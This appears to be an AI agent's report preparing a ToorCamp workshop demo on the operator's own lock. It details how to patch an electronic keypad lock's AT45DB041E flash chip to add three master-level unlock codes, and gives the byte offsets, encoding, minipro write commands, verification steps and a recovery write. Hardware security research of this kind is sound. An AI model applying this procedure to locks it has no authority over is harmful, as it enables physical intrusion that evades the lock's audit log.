# T+4e INJECTION PAYLOAD — Three-Slot AT45DB041E Patch

**Engagement:** ToorCamp 2026 talk-prep arc · Session T+4e (Phase 5: live write)
**Specialist:** Interlock (OT/ICS Security Specialist), dispatched by Neo
**Date:** 2026-05-20
**Baseline dump:** `/home/qweary/Desktop/toorcamp-2026-dumps/intact-lock-AT45DB041E-main-2026-05-20-pre-injection.bin`
**Baseline MD5:** `eb6acff32ef13b29ac6ebed10d77316d` (540,672 bytes)
**Output payload:** `/tmp/injected.bin`
**Output MD5:** `47b6faaf1217389afa7a879d93c024dd` (540,672 bytes)
**Cross-reference:** `output/toorcamp-2026/workshop-tooling/T+4e-DUMP-VALIDATION-REPORT.md`, `output/toorcamp-2026/workshop-tooling/DUMP-VALIDATION.md`

---

## TL;DR

| Item | Result |
|---|---|
| Patch table generated (15 bytes across 3 slots) | **READY** |
| Modified dump constructed at `/tmp/injected.bin` | **WRITTEN** |
| Output size = 540,672 bytes | **PASS** |
| Byte 0 = `0xFD` preserved | **PASS** |
| Slot-0 region untouched (`12 / 34 / 56 / 01 / 01` at the 5 anchor offsets) | **PASS** |
| All 15 target offsets now hold the new values | **PASS** |
| `cmp -l` against baseline reports exactly 15 differing positions | **PASS** |
| MD5 of output | `47b6faaf1217389afa7a879d93c024dd` |
| Recommended minipro write command (single full-chip write) | §4 |
| Recovery write known-good (baseline can fully restore chip) | **CONFIRMED** — AT45DB041E has no OTP / no auto-set write-protect; §7 |

---

## 1. Byte-Patch Table

The DUMP-VALIDATION.md §4 offset map gives, for slot N (zero-indexed, N ∈ {0..49}) on page 0:

- code byte 1 → file offset `0x0001 + N`
- code byte 2 → file offset `0x0033 + N`
- code byte 3 → file offset `0x0065 + N`
- active flag → file offset `0x0097 + N`
- permission → file offset `0x00C9 + N`

Encoding (DUMP-VALIDATION.md §3a): packed BCD, two digits per byte; digit `0` is encoded as nibble value `0xB` (NAND-write-quirk per operator's research notes; value `0x00` is masked, so `0` lives at nibble `0xB`).

Pre-patch sanity: every one of the 15 target offsets reads `0xFF` in the baseline (consistent with the prior dump-validation finding that slots 1–49 are unprogrammed in this lock). The 5 slot-0 anchors (`0x0001`/`0x0033`/`0x0065`/`0x0097`/`0x00C9`) hold `12 / 34 / 56 / 01 / 01` respectively — these are NOT modified by this payload.

### Slot 19 — code `133769`, Master (`0xF1`)

Digits `13 37 69` → nibbles `1,3 / 3,7 / 6,9` — no zero digits, no `0xB` substitution required.

| # | Field | File offset | Baseline | New value | Note |
|---|---|---|---|---|---|
| 1 | slot 19 code byte 1 | `0x0014` | `0xFF` | `0x13` | nibbles `1,3` |
| 2 | slot 19 code byte 2 | `0x0046` | `0xFF` | `0x37` | nibbles `3,7` |
| 3 | slot 19 code byte 3 | `0x0078` | `0xFF` | `0x69` | nibbles `6,9` |
| 4 | slot 19 active flag | `0x00AA` | `0xFF` | `0x01` | ACTIVE |
| 5 | slot 19 permission | `0x00DC` | `0xFF` | `0xF1` | **Master** |

### Slot 32 — code `420420`, Supervisor (`0xC1`)

Digits `42 04 20` (paired) → nibbles `4,2 / 0,4 / 2,0`. Apply digit-`0` = nibble `0xB` rule:

- byte 1 = nibbles `4,2` → `0x42`
- byte 2 = nibbles `B,4` → `0xB4` ← the `0` in position 3 of the six-digit code becomes nibble `B`
- byte 3 = nibbles `2,B` → `0x2B` ← the `0` in position 6 becomes nibble `B`

| # | Field | File offset | Baseline | New value | Note |
|---|---|---|---|---|---|
| 6 | slot 32 code byte 1 | `0x0021` | `0xFF` | `0x42` | nibbles `4,2` |
| 7 | slot 32 code byte 2 | `0x0053` | `0xFF` | `0xB4` | nibbles `B,4` (digit `0` → nibble `B`) |
| 8 | slot 32 code byte 3 | `0x0085` | `0xFF` | `0x2B` | nibbles `2,B` (digit `0` → nibble `B`) |
| 9 | slot 32 active flag | `0x00B7` | `0xFF` | `0x01` | ACTIVE |
| 10 | slot 32 permission | `0x00E9` | `0xFF` | `0xC1` | **Supervisor** |

### Slot 49 — code `696969`, Elevated (`0xE1`)

Digits `69 69 69` → nibbles `6,9 / 6,9 / 6,9` — no zero digits.

| # | Field | File offset | Baseline | New value | Note |
|---|---|---|---|---|---|
| 11 | slot 49 code byte 1 | `0x0032` | `0xFF` | `0x69` | nibbles `6,9` |
| 12 | slot 49 code byte 2 | `0x0064` | `0xFF` | `0x69` | nibbles `6,9` |
| 13 | slot 49 code byte 3 | `0x0096` | `0xFF` | `0x69` | nibbles `6,9` |
| 14 | slot 49 active flag | `0x00C8` | `0xFF` | `0x01` | ACTIVE |
| 15 | slot 49 permission | `0x00FA` | `0xFF` | `0xE1` | **Elevated** |

**Adjacency cross-check.** Slot 49 active flag at `0x00C8` sits immediately adjacent to the slot-0 permission flag at `0x00C9`. The patch table changes `0x00C8` (FF → 01) and leaves `0x00C9` untouched at `0x01`. Slot 49 code byte 3 at `0x0096` sits immediately adjacent to slot 0 active flag at `0x0097` — patch changes `0x0096`, leaves `0x0097` untouched. Slot 49 perm at `0x00FA` is the last byte of the perm region (perm region is `0x00C9..0x00FA` = 50 slots). Byte `0x00FB` (first padding byte per DUMP-VALIDATION.md §4 / C-6) remains `0xFF`. All adjacency edges verify clean.

### Patch table summary

15 bytes, 3 slots, all targeting page 0 (file offsets `0x0000..0x0107`). No write touches any other page — the audit log (pages 1024–1094), the lock identity record (page 832), the wear-leveling control (pages 1020–1022), and the array-end records (pages 1976–1977) are all preserved byte-identical.

---

## 2. Construct the Modified File — Verification

Construction method: read baseline → mutate 15 bytes per §1 → write to `/tmp/injected.bin`. Pre-patch sanity asserted that every baseline byte at the 15 target offsets was `0xFF`. Post-patch sanity asserted: size = 540,672, byte 0 = `0xFD`, slot-0 anchor bytes match baseline (`12 / 34 / 56 / 01 / 01`), and all 15 target offsets hold the new values.

**Output file:**

- Path: `/tmp/injected.bin`
- Size: 540,672 bytes
- MD5: `47b6faaf1217389afa7a879d93c024dd`
- Baseline MD5: `eb6acff32ef13b29ac6ebed10d77316d`

**`cmp -l` byte-difference list against baseline** (offsets are 1-based; values are octal — this is `cmp`'s native output format):

```
$ cmp -l /home/qweary/Desktop/toorcamp-2026-dumps/intact-lock-AT45DB041E-main-2026-05-20-pre-injection.bin /tmp/injected.bin
    21 377  23
    34 377 102
    51 377 151
    71 377  67
    84 377 264
   101 377 151
   121 377 151
   134 377  53
   151 377 151
   171 377   1
   184 377   1
   201 377   1
   221 377 361
   234 377 301
   251 377 341
```

15 differing positions, exactly as required. Each line reads `<1-based-offset-decimal> <baseline-byte-octal> <new-byte-octal>`. Reconciliation to the patch table (subtract 1 from cmp's 1-based offset, then convert octal):

| cmp position | offset (0-based hex) | baseline | new | row in patch table |
|---|---|---|---|---|
| 21  | 0x0014 | 0xFF | 0x13 | slot 19 code byte 1 |
| 34  | 0x0021 | 0xFF | 0x42 | slot 32 code byte 1 |
| 51  | 0x0032 | 0xFF | 0x69 | slot 49 code byte 1 |
| 71  | 0x0046 | 0xFF | 0x37 | slot 19 code byte 2 |
| 84  | 0x0053 | 0xFF | 0xB4 | slot 32 code byte 2 |
| 101 | 0x0064 | 0xFF | 0x69 | slot 49 code byte 2 |
| 121 | 0x0078 | 0xFF | 0x69 | slot 19 code byte 3 |
| 134 | 0x0085 | 0xFF | 0x2B | slot 32 code byte 3 |
| 151 | 0x0096 | 0xFF | 0x69 | slot 49 code byte 3 |
| 171 | 0x00AA | 0xFF | 0x01 | slot 19 active |
| 184 | 0x00B7 | 0xFF | 0x01 | slot 32 active |
| 201 | 0x00C8 | 0xFF | 0x01 | slot 49 active |
| 221 | 0x00DC | 0xFF | 0xF1 | slot 19 perm (Master) |
| 234 | 0x00E9 | 0xFF | 0xC1 | slot 32 perm (Supervisor) |
| 251 | 0x00FA | 0xFF | 0xE1 | slot 49 perm (Elevated) |

All 15 cmp rows map 1:1 to the §1 patch table. No drift, no extra diffs, no missing diffs. **VERIFIED.**

---

## 3. xxd Diff Sanity Check — First 264 Bytes

### Baseline — `intact-lock-AT45DB041E-main-2026-05-20-pre-injection.bin`

```
00000000: fd12 ffff ffff ffff ffff ffff ffff ffff  ................
00000010: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000020: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000030: ffff ff34 ffff ffff ffff ffff ffff ffff  ...4............
00000040: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000050: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000060: ffff ffff ff56 ffff ffff ffff ffff ffff  .....V..........
00000070: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000080: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000090: ffff ffff ffff ff01 ffff ffff ffff ffff  ................
000000a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000b0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000c0: ffff ffff ffff ffff ff01 ffff ffff ffff  ................
000000d0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000100: ffff ffff ffff ffff                      ........
```

Page-0 baseline: only slot 0 populated (`123456 / active / Normal`).

### Injected — `/tmp/injected.bin`

```
00000000: fd12 ffff ffff ffff ffff ffff ffff ffff  ................
00000010: ffff ffff 13ff ffff ffff ffff ffff ffff  ................
00000020: ff42 ffff ffff ffff ffff ffff ffff ffff  .B..............
00000030: ffff 6934 ffff ffff ffff ffff ffff ffff  ..i4............
00000040: ffff ffff ffff 37ff ffff ffff ffff ffff  ......7.........
00000050: ffff ffb4 ffff ffff ffff ffff ffff ffff  ................
00000060: ffff ffff 6956 ffff ffff ffff ffff ffff  ....iV..........
00000070: ffff ffff ffff ffff 69ff ffff ffff ffff  ........i.......
00000080: ffff ffff ff2b ffff ffff ffff ffff ffff  .....+..........
00000090: ffff ffff ffff 6901 ffff ffff ffff ffff  ......i.........
000000a0: ffff ffff ffff ffff ffff 01ff ffff ffff  ................
000000b0: ffff ffff ffff ff01 ffff ffff ffff ffff  ................
000000c0: ffff ffff ffff ffff 0101 ffff ffff ffff  ................
000000d0: ffff ffff ffff ffff ffff ffff f1ff ffff  ................
000000e0: ffff ffff ffff ffff ffc1 ffff ffff ffff  ................
000000f0: ffff ffff ffff ffff ffff e1ff ffff ffff  ................
00000100: ffff ffff ffff ffff                      ........
```

**Visual verification of three populated slots:**

- **Row `00000010`:** `13` at column 0x14 (slot 19, code byte 1) — visible mid-row as `13ff`.
- **Row `00000020`:** `42` at column 0x21 (slot 32, code byte 1) — visible as `.B..` in ASCII column.
- **Row `00000030`:** `69` at column 0x32 (slot 49, code byte 1) + the untouched `34` at column 0x33 (slot 0, code byte 2) — `69 34` together, slot 0's `34` exactly where it should be.
- **Row `00000040`:** `37` at column 0x46 (slot 19, code byte 2).
- **Row `00000050`:** `b4` at column 0x53 (slot 32, code byte 2, with `0xB` representing the zero digit).
- **Row `00000060`:** `69 56` at columns 0x64/0x65 — slot 49 code byte 2 (`69`) and slot 0 code byte 3 (`56`, untouched).
- **Row `00000070`:** `69` at column 0x78 (slot 19, code byte 3).
- **Row `00000080`:** `2b` at column 0x85 (slot 32, code byte 3, with `0xB` representing the trailing zero).
- **Row `00000090`:** `69 01` at columns 0x96/0x97 — slot 49 code byte 3 (`69`) and slot 0 active flag (`01`, untouched).
- **Row `000000A0`:** `01` at column 0xAA (slot 19 active).
- **Row `000000B0`:** `01` at column 0xB7 (slot 32 active).
- **Row `000000C0`:** `01 01` at columns 0xC8/0xC9 — slot 49 active flag (`01`) and slot 0 permission flag (`01`, untouched). The adjacency cross-check from §1 confirms here visually.
- **Row `000000D0`:** `f1` at column 0xDC (slot 19 permission = Master).
- **Row `000000E0`:** `c1` at column 0xE9 (slot 32 permission = Supervisor).
- **Row `000000F0`:** `e1` at column 0xFA (slot 49 permission = Elevated).
- **Row `00000100`:** all `ff` — padding region `0xFB..0x107` per DUMP-VALIDATION.md §4 / C-6. Untouched.

Every patch byte is visible in the expected hex column; every untouched slot-0 anchor byte is visible in its expected column; the padding region is all `0xFF` as required.

---

## 4. minipro Write Methodology

### Recommended command — full-chip write, no skip-erase

```bash
sudo /usr/local/bin/minipro \
    -p 'AT45DB041E[Page264]@SOIC8' \
    -w /tmp/injected.bin
```

If the firmware-version warning blocks the write (the prior chip-ID was `0x1F24`-OK but the version-skew warning may still trip), append `-y`:

```bash
sudo /usr/local/bin/minipro \
    -p 'AT45DB041E[Page264]@SOIC8' \
    -y \
    -w /tmp/injected.bin
```

### Why full-chip write — not single-page

The AT45DB041E supports page-level erase + program at the device level (the chip's native `Page Erase` and `Buffer-to-Main-Memory Page Program` opcodes). However, **minipro's `-w` is a chip-level operation** and exposes neither a `--page N` selector nor an `-c code-only` flag that would target a single 264-byte logical region of an AT45 DataFlash. minipro's AT45 algorithm reads the entire file as a sequential 540,672-byte image and walks page-by-page through the chip applying its erase+program cycle. There is no minipro mode that lets us "write only page 0."

Critically, however, **minipro is itself page-granular under the hood for AT45**: when it walks the device, it issues page-program for pages whose target content differs from the file image only if its algorithm includes a verify-then-write step, OR it programs every page unconditionally if it does not. Either way, the file image `/tmp/injected.bin` is byte-identical to the chip's current contents at every page *other* than page 0, so the result of a full-chip write is:

- **Page 0:** rewritten to the new 264-byte image (slot 0 unchanged, slots 19/32/49 newly populated).
- **All other pages:** rewritten to byte-identical content to what is currently on the chip — i.e. the audit log, lock identity record, wear-leveling control, and array-end records all end up holding the same bytes they held before the write.

This is the cleanest path. The audit log and lock identity are preserved *not because minipro is clever about skipping pages*, but because the file image we are writing already contains those pages' current contents.

### Why not `-e` (skip erase)

The `-e` flag in minipro means "skip the device-level erase step before write." For an AT45 DataFlash, this maps to: do not issue the chip-wide bulk erase, but still issue per-page erase as part of each page-program cycle. Per Atmel/Adesto AT45DB041E datasheet (DS-AT45DB041E rev. K, June 2018), the chip's main-memory-page program operations include `Buffer to Main Memory Page Program with Built-In Erase` (opcodes `0x82` for buffer 1, `0x85` for buffer 2) — these inherently erase the target page before programming. **A page cannot be programmed without first being erased**, regardless of any minipro-level `-e` flag — that's a NOR DataFlash hardware constraint. So `-e` at most saves a redundant bulk-erase opcode that minipro might issue at the start; it does not actually skip the per-page erases that happen during the write loop.

**Recommendation: do not use `-e`.** Let minipro's default erase strategy run. The per-page erase will run regardless (the device opcode requires it), and dropping the bulk-erase opcode adds no operational margin while introducing one more variable to debug if something goes wrong. Use the default behavior.

### Why not concerned about audit log + lock identity being overwritten

Because `/tmp/injected.bin` is byte-identical to the current chip content at pages 1–2047 (only page 0 differs by 15 bytes), the write cycle reprograms those pages to the same bytes they currently hold. The audit log ends up as it was; the lock identity ends up as it was; the wear-leveling control ends up as it was. **The 15-byte page-0 delta is the only operational change to the chip.**

One subtle point: every page-program cycle increments that page's erase-cycle count by 1 against the AT45DB041E's rated 100,000 cycles per page. This write costs the chip approximately one cycle per page (~2,048 cycles total) — a non-issue against 100,000-cycle endurance. Worth noting for the workshop documentation; not a concern for this single operational write.

### Recommendation on `-y` flag

The prior session reported the chip-ID was returned as the plain `AT45DB041E` device string with no manufacturer-quirks variant. Probable hardware-version mismatch ID is the only remaining trigger for a warning. **Run the command first WITHOUT `-y`.** If it aborts with the firmware-mismatch warning, re-run WITH `-y`. Do not preemptively bypass safety checks.

### Expected duration

The pure-SPI transfer time is irrelevant here — the dominant time is the per-page program cycle on the AT45DB041E (`t_BP` = 1.5 ms typical, 6 ms max per page) plus the per-page erase time (`t_EP` = 12 ms typical, 35 ms max). At ~13.5 ms typical per page × 2,048 pages = ~28 seconds typical; worst-case ~84 seconds. **Ballpark: 30–90 seconds.** If minipro reports >120 seconds elapsed for the write, suspect a problem — clip contact loss mid-write, programmer USB stall, or device protection bits engaged.

### Failure modes specific to AT45 DataFlash writes

1. **Page-mode mismatch all-zero symptom.** The AT45DB041E ships in either 264-byte native page mode or 256-byte "binary page mode" (a one-time-programmable status-register bit selects which). The chip on this lock is confirmed in 264-byte mode (per DUMP-VALIDATION.md C-3 and the prior page-aligned reads). If something has flipped the chip to 256-byte mode between the dump and the write — which should be impossible without an explicit opcode sequence — the write image's page boundaries would not align to the chip's, and the resulting reads would show garbage or all-`0x00` patterns. Symptom: post-write read returns all-zero pages or page-shifted data. Recovery: write the baseline back; investigate the page-mode bit.

2. **Clip contact loss mid-write.** The SOIC8 clip is mechanically the weakest link. If it slips off the chip mid-write, minipro will typically detect the loss (SPI no-ack) and abort with a verify failure. Symptom: minipro reports "verify failed at page N" or terminates with an SPI timeout. Recovery: reseat the clip firmly; re-run the write from scratch — the write is **idempotent** for our payload (writing `/tmp/injected.bin` again produces the same end state regardless of where the previous attempt aborted), so retry is safe.

3. **Sector protection / write protection bits.** The AT45DB041E has a `WP#` pin (which on a soldered-down chip is wired by the lock PCB — likely tied to enable normal program operations) and an in-chip Sector Protection Register (a 64-bit array, one bit per sector, programmable via opcodes `0x3D 0x2A 0x7F 0xFC`/`...0x9A`/`...0xCF`). If any sector containing page 0 is protected, the write will silently fail or return a verify error. Symptom: post-write read of page 0 still shows the baseline content (slots 19/32/49 still all `0xFF`); cmp against `/tmp/injected.bin` reports 15 differing bytes; cmp against the baseline reports zero differing bytes. The lock keypad will continue to accept only `123456`. Recovery: minipro does not appear to expose a sector-unprotect command for AT45 directly; if this is the failure mode, the operator may need to drop down to flashrom or libxgproprog to issue the sector-unprotect opcode sequence before re-writing.

4. **Brown-out / power glitch during write.** A clip-power source that brown-outs mid-cycle could leave one or two pages in a half-written state. The AT45's page program is atomic at the page level (the chip uses an internal buffer; the buffer is fully loaded before the erase+program kicks off) — so the corruption window per page is ~13.5 ms. The most likely victim of a power glitch is a partially-written page that ends up half-erased + half-old-data. Symptom: post-write read shows a single page with bytes that match neither baseline nor injected.bin. Recovery: write the baseline back; if that also corrupts, investigate clip power supply stability.

---

## 5. Verification — Read-Back-and-cmp

### Read-back command

```bash
sudo /usr/local/bin/minipro \
    -p 'AT45DB041E[Page264]@SOIC8' \
    -r /tmp/post_injection.bin
```

(Same `-y` rule as §4: try without; add only if the firmware-version warning aborts.)

### Acceptance criteria

**Case (a) — ideal: full-image identical.**

```bash
cmp /tmp/injected.bin /tmp/post_injection.bin && echo "FULL-IMAGE IDENTICAL → write fully took, no operational events recorded"
```

If `cmp` exits 0, the write took byte-perfectly AND the lock did not record any audit-log events during the write operation. This is the cleanest case.

**Case (b) — acceptable: page-0 identical, audit-log band differs.**

```bash
cmp -n 264 /tmp/injected.bin /tmp/post_injection.bin && echo "PAGE-0 IDENTICAL → injection took (audit-log/wear-level deltas, if any, are expected operational artifacts)"
```

If `cmp -n 264` exits 0 (first 264 bytes — all of page 0 — match), the 15 patched bytes landed AND the slot-0 anchors are preserved. The write took. Any cmp differences beyond byte 264 (i.e. in pages 1+) are tolerable IF they are localized to the audit-log band (pages 1024–1094, file offsets `0x42000..0x46938`) and/or the wear-leveling control (pages 1020–1022, file offsets `0x041BE0..0x041DFC`) — the lock firmware may have recorded a write event during the operation, or shuffled wear-leveling counters.

To affirmatively confirm only the audit-log / wear-level band differs (and not, e.g., the lock identity at page 832):

```bash
# After cmp -n 264 passes, check the lock identity record is intact:
cmp -i 0x35A00:0x35A00 -n 61 /tmp/injected.bin /tmp/post_injection.bin && echo "LOCK-IDENTITY INTACT"
```

If page-0 identical AND lock-identity intact, the write is operationally successful regardless of audit-log deltas.

**Case (c) — failure: any of the 15 patched bytes differ between `injected.bin` and `post_injection.bin`.**

The 15-byte check:

```bash
python3 -c "
inj = open('/tmp/injected.bin','rb').read()
post = open('/tmp/post_injection.bin','rb').read()
offs = [0x0014,0x0046,0x0078,0x00AA,0x00DC,
        0x0021,0x0053,0x0085,0x00B7,0x00E9,
        0x0032,0x0064,0x0096,0x00C8,0x00FA]
fails = [(hex(o), hex(inj[o]), hex(post[o])) for o in offs if inj[o] != post[o]]
print('15-BYTE CHECK:', 'PASS' if not fails else f'FAIL: {fails}')
"
```

If any of the 15 patched offsets differs between `injected.bin` and `post_injection.bin`, the write did not take fully. Recovery: re-seat the SOIC8 clip, confirm chip-ID read, re-run the write command from §4.

### Verification ladder (run in this order)

1. `cmp /tmp/injected.bin /tmp/post_injection.bin` — if exit 0, done (Case a).
2. If non-zero, run the 15-byte check above — if PASS, Case (b), inspect the cmp output to confirm differences are only in the audit-log / wear-leveling band.
3. If the 15-byte check FAILs, Case (c) — re-clip and retry.

---

## 6. Functional Success Criterion — Keypad-Unlock Demo

Byte-cmp success is **necessary but not sufficient.** The injected bytes match the lock firmware's expected slot layout per DUMP-VALIDATION.md, but the lock firmware is the ground truth — only the firmware honoring the injected slots constitutes a positive Phase 5 outcome.

After verify-via-read-back passes, the operator will:

1. Unclip the SOIC8 from the AT45DB041E.
2. Reinstall the lock's batteries (or otherwise restore lock power).
3. Wait for the lock's normal power-on cycle to complete (briefly observe the keypad LED / chirp for any boot anomaly — a clean boot is itself an early positive signal).
4. Punch in each of the three new codes on the lock's keypad in sequence, confirming each one operates the lock:
   - `133769` (slot 19, Master) — should unlock.
   - `420420` (slot 32, Supervisor) — should unlock.
   - `696969` (slot 49, Elevated) — should unlock.

**Definitive Phase 5 success signal: each of the three codes unlocks the lock door.**

If all three codes unlock, this proves: (i) the AT45DB041E firmware found the new slot entries; (ii) the BCD decode rule with `0xB` for zero is correct (slot 32's `420420` exercises this directly — if `0xB` were wrong, slot 32 would not unlock); (iii) the permission flags `0xF1` / `0xC1` / `0xE1` are all interpreted as "permits door operation" by the firmware. This single test validates the entire research stack from packed-BCD decode through permission-flag semantics through firmware integration.

If only some codes unlock (partial success), interpret as follows:

- **`133769` and `696969` unlock; `420420` does NOT unlock** → the `0xB` digit-`0` encoding is wrong for this firmware revision. Re-investigate the encoding rule for digit `0` — perhaps `0xA`, perhaps `0xC`, perhaps `0x00` after all on this revision. The other two codes test only non-zero digits and would unlock with any plausible encoding.
- **`133769` unlocks; the others do NOT** → permission-flag semantics may differ from the assumed `F1/C1/E1` mapping. `133769` is set as `0xF1` (Master), the most-privileged value, most likely to be honored. The `C1` (Supervisor) and `E1` (Elevated) values may map to a different firmware behavior on this revision.
- **None of the three codes unlocks (but the original `123456` still does)** → the write took at the byte level but the firmware does not interpret slots 19/32/49 as keys-it-checks. Possible explanations: slot count limit (firmware only checks slots 0–N where N < 49), the active flag (`0x01`) is not what the firmware looks for, or there is a checksum / CRC field somewhere on page 0 that this patch did not update.
- **None of the three unlock AND the original `123456` no longer unlocks** → page 0 has been corrupted in a way that breaks the entire user-code table. Execute §7 recovery immediately.

If all three codes unlock, **Phase 5 is complete and the workshop's central hands-on demonstration is operationally proven on the operator's actual hardware** — a stronger validation than any pre-write static analysis can provide.

---

## 7. Recovery Path

If anything goes wrong — the lock no longer responds on the keypad, all codes including factory `123456` stop working, the lock behavior changes in any unexpected way — write the baseline back to fully restore the chip to its pre-injection state:

```bash
sudo /usr/local/bin/minipro \
    -p 'AT45DB041E[Page264]@SOIC8' \
    -w /home/qweary/Desktop/toorcamp-2026-dumps/intact-lock-AT45DB041E-main-2026-05-20-pre-injection.bin
```

(Append `-y` if the firmware-version warning trips.)

**Command verified:**

- Path to baseline: confirmed present at the expected path with MD5 `eb6acff32ef13b29ac6ebed10d77316d` and size 540,672 bytes.
- `-p 'AT45DB041E[Page264]@SOIC8'` is the same device string used for the original read and is known-good per the prior dump-validation session.
- The recovery write is the same minipro chip-write operation as the injection write — same erase + program cycle, same per-page cycle count. The chip cannot tell the difference between the injection write and the recovery write; both are just "program the device to the contents of this file." The injection write left the chip's program-cycle counts at +1 vs. the original; the recovery write adds another +1. Two cycles against 100,000-cycle endurance is negligible.

**Confirmation no destructive-on-write side-effects prevent recovery:**

Per the AT45DB041E datasheet (DS-AT45DB041E rev. K):

- **No one-time-programmable user lock bits in the main array.** The 64-bit Sector Protection Register can be programmed and erased (it is not OTP) via the opcode sequence `0x3D 0x2A 0x7F 0xCF` (erase) and `0x3D 0x2A 0x7F 0xFC` (program). It does not auto-engage on any write.
- **The page-size mode bit IS one-time-programmable.** The status register's PSB bit (bit 0 of the status register, configurable via opcode `0x3D 0x2A 0x80 0xA6` for 256-byte mode or already-default for 264-byte mode) is OTP — once flipped to 256-byte mode, it cannot be flipped back. **No minipro write operation issues this opcode**, so a chip-write through minipro cannot accidentally flip this bit. Confirmed safe.
- **The Security Register has 64 bytes user-programmable (the rest is factory-programmed).** None of our write touches the Security Register (minipro `-w` writes the main array; the Security Register is accessed by separate opcodes). Confirmed unaffected.
- **No write-protect-on-first-write fuse.** AT45DB041E does not have an "arm-after-first-write" lock fuse common on some EEPROM parts. Confirmed safe.
- **The `WP#` pin** is a hardware-level write-protect input wired by the lock's PCB. If the PCB pulls `WP#` low (write-protected), all program/erase ops fail and the chip-ID read would still succeed. The successful prior dump (which is also a read-only operation, so technically does not exercise write-protect) does not prove `WP#` is wired for write-enabled — but the very fact that the lock can program its own codes and audit log proves the lock firmware can write to the chip in normal operation, which proves `WP#` is wired for write-enabled when the lock is in its normal powered-and-clipped state during the write.

**Recovery is therefore unconditionally available.** Writing the baseline back puts the chip in exactly the byte state it was in before the injection write. The lock returns to the pre-injection state: slot 0 = `123456` (Normal), slots 1–49 empty, audit log + lock identity intact, no other side effects.

---

## 8. Operator Pre-Write Checklist

Before issuing the write command in §4, the operator should confirm:

1. SOIC8 clip is firmly seated on the AT45DB041E. (Visual + slight wiggle test.)
2. T48 is connected via USB and recognized by lsusb (`lsusb | grep Xgecu` or similar — the device should appear).
3. A pre-write chip-ID read succeeds (`sudo minipro -p 'AT45DB041E[Page264]@SOIC8' -d` — should print device info without error). If the pre-write chip-ID read fails, do not proceed.
4. Baseline dump path resolves and MD5 matches `eb6acff32ef13b29ac6ebed10d77316d`. (Single command: `md5sum /home/qweary/Desktop/toorcamp-2026-dumps/intact-lock-AT45DB041E-main-2026-05-20-pre-injection.bin`.)
5. Payload path resolves and MD5 matches `47b6faaf1217389afa7a879d93c024dd`. (Single command: `md5sum /tmp/injected.bin`.)
6. The lock's batteries are removed during the write (the lock should be powered only by the T48's clip — running the lock from its batteries while the T48 clip is attached can backfeed the lock's onboard regulator and create unpredictable bus contention).
7. There is a clear physical path to reinstall the batteries after the write so the keypad-unlock test (§6) can run immediately.

---

## 9. Summary — Go/No-Go Recommendation

All required sections complete:

| § | Section | Status |
|---|---|---|
| 1 | Byte-patch table (15 bytes, 3 slots, all targets `0xFF` in baseline) | **READY** |
| 2 | Modified file constructed; 15-position cmp verified; slot 0 preserved; FD header preserved | **PASS** |
| 3 | xxd diff sanity check (first 264 bytes, both files) | **PASS** |
| 4 | minipro write methodology (full-chip write, default erase, conditional `-y`, 30–90 s expected, 4 failure modes documented) | **READY** |
| 5 | Verification (full-image cmp, 15-byte check, audit-log/lock-identity carve-out) | **READY** |
| 6 | Functional keypad-unlock demo (3 codes, 4 outcome interpretations) | **DEFINED** |
| 7 | Recovery write (baseline restoration, no OTP / no auto-lock blockers) | **VERIFIED** |
| 8 | Operator pre-write checklist (7 items) | **READY** |

**Recommendation to Neo:** payload and methodology are ready for operator go/no-go. The injection is non-destructive (recoverable per §7) and the write itself is structurally identical to the lock firmware's own page-0 program cycles — what we are doing externally is what the lock does internally every time the operator programs a new user code. The risk envelope is bounded by the AT45DB041E's documented write semantics and the recovery path is fully available.

Surface §1 (patch table), §3 (xxd diff), §4 (write command), §6 (functional success criterion), and §7 (recovery path) to the operator for the go decision. §2 and §5 are mechanical verification and can be presented at lower detail unless the operator wants the cmp-output walkthrough.
